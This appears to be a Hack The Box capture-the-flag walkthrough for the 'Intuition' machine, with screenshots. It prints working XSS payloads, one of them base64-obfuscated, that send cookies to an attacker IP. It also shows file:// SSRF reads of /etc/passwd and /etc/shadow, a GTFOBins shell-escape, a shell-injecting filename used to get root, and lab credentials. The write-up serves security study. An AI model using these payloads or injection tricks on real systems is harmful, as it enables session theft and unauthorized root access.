---
date: 2025-01-30
categories: [CTF, HTB]
title: "HTB - Intuition"
tags: ['ftp', 'hashcat', 'nmap', 'privilege escalation', 'python', 'rce', 'xss']

description: "Intuition - A walkthrough of the challenge with enumeration, exploitation and privilege escalation steps."
---

---
---

# HTB - Intuition

NMAP

![image1](../resources/4e05df8a718b4e9dbdf689ede618317c.png)

- Subdomain enum:

![image2](../resources/03276ee5eef146f5b66c6cf58dc2a7c0.png)

auth.comprezzor.htb
dashboard.comprezzor.htb
report.comprezzor.htb


- If we go to auth.comprezzor.htb - we can register and login

- We can then go to report.comprezzor.htb and we can see how bugs get escalated:

![image3](../resources/be82204364a748f7813b7351529ec747.png)

- We can report a bug and could be susceptible to XSS

- Tried the following XSS:

{% raw %}
`<img src="http://10.10.14.94/a?cookie=' + document.cookie + '"/>`
{% endraw %}


But didn't get the cookie back:


![image4](../resources/bafda0529f5446fa9ddbbc37c400749b.png)

- Obfuscate the payload (base64) and use eval(atob()):
  - Using the payload:  

`fetch("http://10.10.14.94/"+document.cookie);`

Full XSS evaluates to:

`"/><img src=x onerror="eval(atob('ZmV0Y2goImh0dHA6Ly8xMC4xMC4xNC45NC8iK2RvY3VtZW50LmNvb2tpZSk7'));"/>`



![image5](../resources/6fa851041c254681a6d5fc40997ecf1f.png)


![image6](../resources/80f6226eb7b443a5ba19307e6b61650b.png)

- Cookie base64 decode output:

![image7](../resources/0cc7b5050f654b8f9fd8dc68917e9c80.png)

- Inspect and edit the cookie:

![image8](../resources/a68440045aed4663b87695e72c684c58.png)

- Now we can browse to dashboard:

![image9](../resources/b7f99b913ecb47d5a6b604f901c14c1a.png)

- There isn't much here so we might need to get it escalated to admin

- This seems like the the platform where all the bug reports come to,
so if we send another bug report and then change the priority to 1, the admin might click on it

- Keep the python server running

- Send another bug report and quickly go to the Dashboard and change the priority to high:

![image10](../resources/4345eab33f044152a62700deaf3fe110.png)

- Now wait for the admin cookie (Might need to restart the machine):

![image11](../resources/3e21048153444fbb988487fa8d6f8c3d.png)

eyJ1c2VyX2lkIjogMSwgInVzZXJuYW1lIjogImFkbWluIiwgInJvbGUiOiAiYWRtaW4ifXwzNDgyMjMzM2Q0NDRhZTBlNDAyMmY2Y2M2NzlhYzlkMjZkMWQxZDY4MmM1OWM2MWNmYmVhMjlkNzc2ZDU4OWQ5

- Go to Inspect and enter the admin cookie


![image12](../resources/be1f53279907404e902ae28f2573d9fd.png)

**<u>SSRF - PDF Generator (wkhtmltopdf 0.12.6) - Dead End</u>**

- On the Admin dashboard - we have Create PDF Report

- Create a dummy txt file on the attacker machine

- Set up a simple python server

- Now if we go to Create PDF Report:

![image13](../resources/50cb25d92b224b17ac5b5f69e1aae484.png)

We can enter our URL and get a PDF back

- If we inspect the PDF, we can see what library the web application is using to generate these PDF documents:

![image14](../resources/1d29cea84cdb48289514f64edf70e2fe.png)

- For this generator, **wkhtmltopdf 0.12.6** is used


![image15](../resources/b0c38fbd88384e9a98572a45984cf280.png)

- If we google this - we can see that there is a SSRF vulnerability:

![image16](../resources/5f9ddd7a96aa42b1bba11dcfbc95fbf5.png)

- Couldn't get this to work

**<u>SSRF - Python-urllib/3.11 - Actual Foothold</u>**

- We can send another request to ourselves:

![image17](../resources/031950de231e4fa88e84a7f9704e3e5b.png)

- But this time catch it with nc (as Burp didn't give me anything):

![image18](../resources/24c1b277c2514541b14f1456dd6d9716.png)

- We can see something interesting here:
User-Agent: Python-urllib/3.11

- This version has a CVE:
<https://vsociety.medium.com/cve-2023-24329-bypassing-url-blackslisting-using-blank-in-python-urllib-library-ee438679351d>


![image19](../resources/68fb66abd08542949fd056118eccf0c1.png)

- All we need to do to check this vulnerability is to add a space before our LFI command:

```bash
<space>file:///etc/passwd

```

![image20](../resources/d883016502dc49a6b9464ded93f7dc93.png)

- And we get a pdf back:

![image21](../resources/6b43da68abc74516abea7cb32c3492d0.png)

- Also for /etc/hosts

![image22](../resources/85784b0c0c354b2188eb99bff0e094ca.png)

- And we can read /etc/shadow (so running as root?)

![image23](../resources/b323a92873274a7a8a0bec469df00e8c.png)

- To see the current running process on the machine - we can check /proc:

file:///proc/self/cmdline


![image24](../resources/684b6aa16fbc4926b7a4cb59d726916c.png)

- And we get a pdf back with:

![image25](../resources/506c63ae640a46699436f62135146db8.png)

So we can see Python3 is running an app.py file

- We can download this python file:


![image26](../resources/09f1fe68fe324d8d933d03538825eddc.png)


![image27](../resources/eb48f766bfcb4e7c91ac15a923005559.png)

- There isn't much of interest here. The secret key is used for session and we have the admin cookie already

- But it does import other modules ie. other scripts
  And it calls it from ./blueprints/<dir name>/<python_script>

[file:///app/code/blueprints/dashboard/dashboard.py](file://app/code/blueprints/dashboard/dashboard.py)


![image28](../resources/8b7a5f4367dc4988b918611c5fff2ff0.png)
- We get ftp credentials:


![image29](../resources/2eb04e8ea5ae47a49c86a61dc70d2302.png)

user='ftp_admin', passwd='u3jai8y71s2'

- To connect to the ftp server (running locally) - we can use the FTP URI: [ftp://username:password@hostname

ftp://ftp_admin:u3jai8y71s2@ftp.local


![image30](../resources/ca2fe8ea2a9347c8a47c2a46b4ed2fe0.png)


![image31](../resources/487d1c4fe88c435eb63a08f4a6dae4da.png)

- Download the private key and the welcome_note:

![image32](../resources/d8cd6ea77b3a4aa0833b13385969a09e.png)


![image33](../resources/632e48302ef64da9880bdd8f33662966.png)


![image34](../resources/12c30bd17cd44fdabbee4e3150d26ab1.png)

Passphrase: **Y27SH19HDIWD**

- Copy the contents and edit the last line so it's on a new line:

![image35](../resources/e2cac4ccae9b410d9e2e004db6810fe9.png)

- chmod 600 key

- We have the old passphrase so we can update the passphrase and get the user potentially:

```bash
ssh-keygen -p -f key

```

![image36](../resources/01de94d627bb4058a9c57b29e4e2e7ef.png)

We get user dev_acc

- Now we can ssh in:

![image37](../resources/2d23d46caf694b6ea4449f8def27e387.png)


![image38](../resources/714aa3c4bfab40a6ab403a8eba4f0a3a.png)

- Upload Linpeas:

![image39](../resources/778560a741ab439d9aa35d95c4bf1217.png)


![image40](../resources/0155ed6f937742e59866df798408e84d.png)


![image41](../resources/da182bea5e2a4ad79d313603f4865baf.png)

- We know that dev_acc is web root so we can go into /var and look at the files in there
- We also know that Flask is being used for authentication so there must be a database somewhere in /var
- And we stole Adam and Admin's cookies before, so chances are they have credentials stored

```bash
find . -type f -name '\*.db' 2\>/dev/null

```

![image42](../resources/1b128fad4cfc4738afb0ab4f63454aa8.png)

- We got some hashes for adam and admin:

![image43](../resources/bd81c4295c884ace8e8707f93c3db558.png)

```bash
hashcat -a 0 -m 30120 hash.txt /usr/share/wordlists/rockyou.txt

```

![image44](../resources/75d47b2342d44238b86b157f52a6a134.png)

**adam : adam gray**

- We can't switch user with those credentials

![image45](../resources/0e062550235346fbad51fbb74f4a13cf.png)

- But we can acces the ftp server:

![image46](../resources/fcb58678f5f64c85b7220b58adb44d3e.png)


![image47](../resources/5894b1152ed34f869b4c2d87a603bb7a.png)

- Download the files

![image48](../resources/3c9975d957aa437783a80fcf1f1a2f6c.png)


![image49](../resources/a0377d569c584a2983d01f849e91ff8a.png)

- Copy over with scp:

![image50](../resources/05132658337b4ff08f57a055a83181f8.png)

- We see the arguments needed to run the executable and also the first part of the auth key:

![image51](../resources/1dbad0b5a4fc4e2dbdc2398bbacb2459.png)

- In the source code we get the auth key hash (as well as mentions of Ansible):

![image52](../resources/512ecdedf7eb4610bac4d72f16decf10.png)

- We can create a script that bruteforces the last 4 digits of the auth key, by comparing the hashes:

![image53](../resources/8029439a2f094a3aa32dc7f6f732b844.png)


![image54](../resources/4335ce21a01544ee9682cef8d71bcf2a.png)

Auth key: **UHI75GHINKOP**

- We still can't run the executable because we aren't root

- We can look in the /opt dir, mentioned in the source code:

![image55](../resources/48b8e11e949f48cb8892b6bc1ca3be2b.png)

- But we can't access the playbooks or runner2 dir
- If we were either adam or lopez (sys-adm group) we could

- But we need to do further enumeration

- If we look in /var/log to see if we can find any logged credentials - we find Suricata

![image56](../resources/525cbe0976ec49e3bf73f5d189180531.png)

- So we can assume that it's been logging network activity, since there are loads of files in here:

![image57](../resources/6aff0cb3d6714235b24fde144cfa2f75.png)

- If we grep for credentials or users - we get nothing

- This is because grep doesn't look in compressed files

- To search through compressed files we can use **zgrep**:

![image58](../resources/d57fd407f4584c568783feb595e4b7f1.png)

```bash
zgrep -nwi . -e "lopez" \*.gz

```

![image59](../resources/a6fec4e6976e428380086e0b48fc135e.png)

We can see Lopez logged in to the FTP server in plaintext with the password:

**Lopezz1992%123**

And now we can su to Lopez


![image60](../resources/7c103d20d60e4a41b31c2a0beeb97a24.png)

- Since we have the password we can check sudo privileges:

![image61](../resources/b89d765dec1d40f9a3167fc62deaba95.png)

- If we try and run the runner2 program - it expects a JSON:

![image62](../resources/ee6413f16b4d430483bdd3df6b834582.png)

- If we give it a random JSON - we get an error:

![image63](../resources/4707ae04f928443484146961534150ab.png)

- If we strings it - it looks like it's using the same arguments as runner but it only accepts a JSON:

![image64](../resources/9e1a1e56771f4da1bd2f02eede5e423b.png)

- If we run the runner2 executable in IDA, we can see what it does:


![image65](../resources/f6df30497f1f45beb49983fb30d70eb4.png)


![image66](../resources/f553308d956248258dd5c2badd1e5054.png)


![image67](../resources/4a29b75585a4430fb87084dbc576e3dc.png)
- It still expects the same arguments as runner but in a JSON format


![image68](../resources/39439084da8944d49cd52ae93e843439.png)

- It looks like we have three different actions: list \| run \| install

- So it expects a JSON with those parameters - So if we try the following:


![image69](../resources/d4d050284c0f42649753f3d748655304.png)

- It works:

![image70](../resources/49839c881adb429a8dbb3876f9f8052e.png)

- The ansible binaries that is uses are running as root -so if we check GTFO bins:

![image71](../resources/982c0e1d126343a0b87021115205928f.png)

- We might be able to break out of the shell and into a superuser shell by adding:
  tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]



![image72](../resources/b70195bbbf4c4457a064894f67cc725f.png)

- But it didn't work

![image73](../resources/014dfb5bc4114c608022f9db3509c06d.png)

**<u>Ansible - Install roles:</u>**

- We have the third option still - install - which needs a role_file

- We will need a tar.gz file that contains role information to install

- This GitHub provides certain templates for us to modify
This template has a clear structure for an Ansible role skeleton generated byansible-galaxy init

[https://github.com/coopdevs/ansible-role-template](https://github.com/coopdevs/ansible-role-template)

- This **metadata folder must be included in the .tar.gz** to install. And there's a **tasks folder** includes the tasks it's going to apply. Both folders include an important file called **main.yaml**

- The metadata does not contain tasks itself but describes the role and its requirements, such as the author, platform compatibility, and tags for categorization in Ansible Galaxy

- In Ansible, the role name is typically the name of the directory where the role is stored within our roles directory. We can identify the default directory by using this command:

```bash
ansible-config dump | grep -i roles_path

```

![image74](../resources/af0105d065cf4c42911d88e1ef8fef7d.png)

When we use a role in a playbook, Ansible looks up this directory name under the paths specified by the roles_path configuration.

If we are using this template, it would then be sys-admins-role-0.0.3

There should be a way to root by modifying the main.yaml in the tasks folder

- When we look at runner1.c source code - we can see that installRole uses the system() library to execute the command
And we can control the \*roleURL pointer as it points to the memory that is storing the value for role_file:


![image75](../resources/3e26ad4ce6b143c183e770ef78ae7b4c.png)

We could craft a filename or a path that includes shell metacharacters or control characters (;, &&, \|, \$(...), etc.)

When system executes the constructed command, the shell will interpret these metacharacters, allowing the us to execute arbitrary commands

- The role_file expects a tar.gz file (from the documentation) - and the binary will verify if it's a **valid compressed file** for /usr/bin/ansible-galaxy to run
so we have to use the template tar.gz file we got from Coopdev's github

- mkdir /home/lopez/.ansible

- Copy the file over to /home/lopez/.ansible

![image76](../resources/275630cb6e354583ad814883c2777a1d.png)

- Rename the file to temp.tar.gz\;bash

![image77](../resources/0931534c34a64005b4db52bdf279783a.png)

- Create a json file to pass to runner2 - that will install the role_file:

![image78](../resources/8f6c9dee6cea4b2cabbbbea357664a9d.png)

- Now run:

```bash
sudo /opt/runner2/runner2 role.json

```

![image79](../resources/ec8fe5a39f374f45b9c37d94b4fea68c.png)

And we have root!